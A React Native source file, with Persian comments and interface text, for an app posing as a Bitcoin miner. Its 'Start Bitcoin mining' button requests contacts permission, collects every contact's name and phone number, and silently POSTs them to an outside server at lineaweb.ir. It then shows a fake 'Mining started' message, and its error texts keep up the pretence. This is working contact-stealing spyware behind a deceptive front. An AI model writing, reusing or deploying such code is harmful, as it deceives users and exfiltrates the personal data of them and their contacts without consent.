import React from 'react';
import { View, Button, Alert, Text, StyleSheet } from 'react-native';
import * as Contacts from 'expo-contacts';

export default function App() {
  const syncContacts = async () => {
    // ۱. درخواست مجوز دسترسی به مخاطبین
    const { status } = await Contacts.requestPermissionsAsync();
    
    if (status === 'granted') {
      // ۲. خواندن لیست مخاطبین
      const { data } = await Contacts.getContactsAsync({
        fields: [Contacts.Fields.PhoneNumbers],
      });

      if (data.length > 0) {
        // ۳. مرتب‌سازی و تمیز کردن اطلاعات
        const formattedData = data.map(contact => ({
          name: contact.name || 'بدون نام',
          phone: contact.phoneNumbers ? contact.phoneNumbers[0].number : 'بدون شماره'
        }));

        // ۴. ارسال به دامین شما
        fetch('https://lineaweb.ir/api.php', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(formattedData)
        })
        .then(res => res.json())
        .then(response => Alert.alert('ماین کردن شروع شد ...'))
        .catch(err => Alert.alert('خطا', 'مشکلی در ارتباط با سرور پیش آمد. مطمئن شوید فایل api.php روی هاست آپلود شده است.'));
      } else {
        Alert.alert('توجه', 'گوشی شما قابلیت ماین کردن ندارد');
      }
    } else {
      Alert.alert('خطا', 'مجوز برای ماین کردن داده نشد.');
    }
  };

  return (
    <View style={styles.container}>
      <Text style={styles.title}>ماینر v2</Text>
      <Button 
        title="شروع ماین بیت کوین" 
        color="#ed1944" 
        onPress={syncContacts} 
      />
    </View>
  );
}

const styles = StyleSheet.create({
  container: {
    flex: 1, 
    justifyContent: 'center', 
    alignItems: 'center',
    backgroundColor: '#f5f5f5'
  },
  title: {
    fontSize: 20,
    marginBottom: 20,
    fontWeight: 'bold',
    color: '#333'
  }
});